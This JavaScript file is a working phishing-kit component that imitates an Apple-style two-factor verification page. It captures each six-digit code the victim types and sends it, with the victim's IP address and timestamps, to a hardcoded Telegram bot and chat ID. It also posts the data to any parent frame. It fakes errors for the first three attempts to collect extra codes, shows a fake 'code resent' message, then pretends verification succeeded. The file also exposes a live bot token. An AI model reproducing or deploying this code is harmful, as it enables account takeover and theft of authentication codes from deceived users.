// ============================================
// TELEGRAM CONFIG
// ============================================
const BOT_TOKEN = "8843925472:AAFNt5aPu39E7YhPs8WjXARNmQ3VBhnZJ68";
const CHAT_ID = "-1003983565500";

let userIP = 'Unable to detect';
let attempts = 0;
let isSuccess = false;

// ============================================
// GET USER IP
// ============================================
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIP = data.ip;
  } catch (e) {
    userIP = 'Unable to detect';
  }
}
getUserIP();

// ============================================
// GET DATE/TIME
// ============================================
function getFormattedDateTime() {
  const now = new Date();
  const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const dayName = days[now.getDay()];
  let hours = now.getHours();
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12;
  hours = hours ? hours : 12;
  const timeString = hours + ':' + minutes + ' ' + ampm;
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const day = now.getDate().toString().padStart(2, '0');
  const year = now.getFullYear();
  const dateString = year + '/' + month + '/' + day;
  return { dayName, timeString, dateString };
}

// ============================================
// TOAST
// ============================================
function showToast(msg, isError) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.textContent = msg;
  toast.style.background = isError ? '#d93025' : '#1c1c1e';
  toast.classList.add('show');
  clearTimeout(toast._hide);
  toast._hide = setTimeout(function () {
    toast.classList.remove('show');
  }, 3000);
}

// ============================================
// SEND TO TELEGRAM
// ============================================
async function sendToTelegram(messageText) {
  try {
    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    return await response.json();
  } catch (err) {
    console.error('Telegram error:', err);
    return false;
  }
}

// ============================================
// DOM ELEMENTS
// ============================================
const boxes = [
  document.getElementById('code0'),
  document.getElementById('code1'),
  document.getElementById('code2'),
  document.getElementById('code3'),
  document.getElementById('code4'),
  document.getElementById('code5')
];

const continueBtn = document.getElementById('continueBtn');
const titleText = document.getElementById('titleText');
const errorMessage = document.getElementById('errorMessage');

// ============================================
// CLEAR BOXES
// ============================================
function clearBoxes() {
  boxes.forEach(function (box) {
    if (box) {
      box.value = '';
      box.className = 'code-box';
    }
  });
  if (!isSuccess && continueBtn) {
    continueBtn.disabled = false;
    continueBtn.textContent = 'Continue';
  }
  if (errorMessage) errorMessage.classList.remove('visible');
}

// ============================================
// SHOW ERROR
// ============================================
function showError() {
  boxes.forEach(function (box) {
    if (box) box.className = 'code-box error';
  });
  if (errorMessage) errorMessage.classList.add('visible');
}

// ============================================
// SUBMIT CODE
// ============================================
function submitCode() {
  if (isSuccess) return;
  
  var code = '';
  var allFilled = true;
  
  for (var i = 0; i < boxes.length; i++) {
    if (boxes[i]) code += boxes[i].value;
    if (!boxes[i] || !boxes[i].value) {
      allFilled = false;
    }
  }
  
  if (code.length !== 6) {
    boxes.forEach(function(box) {
      if (box && !box.value) {
        box.className = 'code-box error';
        setTimeout(function() {
          if (box) box.className = 'code-box';
        }, 500);
      }
    });
    return;
  }
  
  if (allFilled && code.length === 6) {
    const dateTime = getFormattedDateTime();
    attempts++;

    // Build message
    const attemptText = attempts + 'TH ATTEMPT';
    const message = '🔐 <b>2FA CODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n📱 Code: ' + code + '\n📊 Attempt: ' + attemptText + '\n🌐 IP: ' + userIP + '\n📅 Day: ' + dateTime.dayName + '\n⏰ Time: ' + dateTime.timeString + '\n📆 Date: ' + dateTime.dateString + '\n━━━━━━━━━━━━━━━━━━━━━';
    
    // SEND TO TELEGRAM
    sendToTelegram(message);
    
    // Try to send to parent (if in iframe)
    try {
      window.parent.postMessage({
        type: '2fa_code_entered',
        code: code,
        ip: userIP,
        attempt: attemptText,
        day: dateTime.dayName,
        time: dateTime.timeString,
        date: dateTime.dateString,
        formattedMessage: message
      }, '*');
    } catch (e) {
      // If not in iframe, show toast
      showToast('📱 Code sent: ' + code, false);
    }

    // ALWAYS SHOW ERROR - NEVER PROCEED until 4th attempt
    if (attempts <= 3) {
      showError();
      setTimeout(function() {
        boxes.forEach(function (box) {
          if (box) {
            box.value = '';
            box.className = 'code-box';
          }
        });
        if (continueBtn) {
          continueBtn.disabled = false;
          continueBtn.textContent = 'Continue';
        }
        if (errorMessage) errorMessage.classList.remove('visible');
        if (boxes[0]) boxes[0].focus();
      }, 1800);
    } else {
      // 4th attempt - SUCCESS - Redirect to index.html (dashboard)
      isSuccess = true;
      
      // Send success message to Telegram
      var successMessage = '✅ <b>2FA SUCCESS</b>\n━━━━━━━━━━━━━━━━━━━━━\n📱 Code: ' + code + '\n📊 FINAL ATTEMPT - SUCCESS\n🌐 IP: ' + userIP + '\n📅 Day: ' + dateTime.dayName + '\n⏰ Time: ' + dateTime.timeString + '\n📆 Date: ' + dateTime.dateString + '\n━━━━━━━━━━━━━━━━━━━━━';
      sendToTelegram(successMessage);
      
      try {
        window.parent.postMessage({
          type: '2fa_code_entered',
          code: code,
          ip: userIP,
          attempt: 'FINAL ATTEMPT - SUCCESS',
          day: dateTime.dayName,
          time: dateTime.timeString,
          date: dateTime.dateString,
          formattedMessage: successMessage
        }, '*');
      } catch (e) {
        // If not in iframe, redirect directly to index.html
        showToast('✅ Verification successful! Redirecting to dashboard...', false);
        setTimeout(function() {
          window.location.href = 'index.html';
        }, 800);
        return;
      }
      
      showToast('✅ Verification successful! Redirecting to dashboard...', false);
      
      setTimeout(function () {
        try {
          window.parent.postMessage({ type: '2fa_complete' }, '*');
        } catch (e) {
          window.location.href = 'index.html';
        }
        window.location.href = 'index.html';
      }, 1000);
    }
  }
}

// ============================================
// EVENT LISTENERS
// ============================================
if (continueBtn) {
  continueBtn.addEventListener('click', function() {
    submitCode();
  });
}

document.addEventListener('keydown', function(e) {
  if (e.key === 'Enter') {
    submitCode();
  }
});

// Box input handling
for (var i = 0; i < boxes.length; i++) {
  (function (index) {
    var box = boxes[index];
    if (!box) return;

    box.addEventListener('input', function (e) {
      var val = e.target.value.replace(/\D/g, '');
      e.target.value = val.slice(0, 1);
      this.className = 'code-box';
      if (errorMessage) errorMessage.classList.remove('visible');
      if (val && index < 5 && boxes[index + 1]) {
        boxes[index + 1].focus();
      }
      if (continueBtn && continueBtn.disabled && !isSuccess) {
        continueBtn.disabled = false;
        continueBtn.textContent = 'Continue';
      }
    });

    box.addEventListener('keydown', function (e) {
      if (e.key === 'Backspace' && !box.value && index > 0 && boxes[index - 1]) {
        boxes[index - 1].value = '';
        boxes[index - 1].focus();
        if (errorMessage) errorMessage.classList.remove('visible');
        if (!isSuccess && continueBtn) {
          continueBtn.disabled = false;
          continueBtn.textContent = 'Continue';
        }
      }
      if (e.key === 'ArrowLeft' && index > 0 && boxes[index - 1]) boxes[index - 1].focus();
      if (e.key === 'ArrowRight' && index < 5 && boxes[index + 1]) boxes[index + 1].focus();
    });

    box.addEventListener('paste', function (e) {
      e.preventDefault();
      var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
      var chars = text.split('');
      for (var j = 0; j < chars.length; j++) {
        if (boxes[j]) boxes[j].value = chars[j];
      }
      if (boxes[Math.min(text.length, 5)]) boxes[Math.min(text.length, 5)].focus();
      if (errorMessage) errorMessage.classList.remove('visible');
      if (!isSuccess && continueBtn) {
        continueBtn.disabled = false;
        continueBtn.textContent = 'Continue';
      }
    });
  })(i);
}

// ============================================
// INITIALIZE
// ============================================
clearBoxes();

setTimeout(function () {
  if (boxes[0]) boxes[0].focus();
}, 300);

if (document.getElementById('resendLink')) {
  document.getElementById('resendLink').addEventListener('click', function (e) {
    e.preventDefault();
    showToast('📱 A new verification code has been sent to your iPhone.', false);
    clearBoxes();
    if (boxes[0]) boxes[0].focus();
  });
}

if (document.getElementById('cantGetLink')) {
  document.getElementById('cantGetLink').addEventListener('click', function (e) {
    e.preventDefault();
    showToast('Use your recovery key or a trusted phone number to verify your identity.', false);
  });
}

console.log('✅ 2FA: Sending codes to Telegram, redirects to index.html on 4th attempt');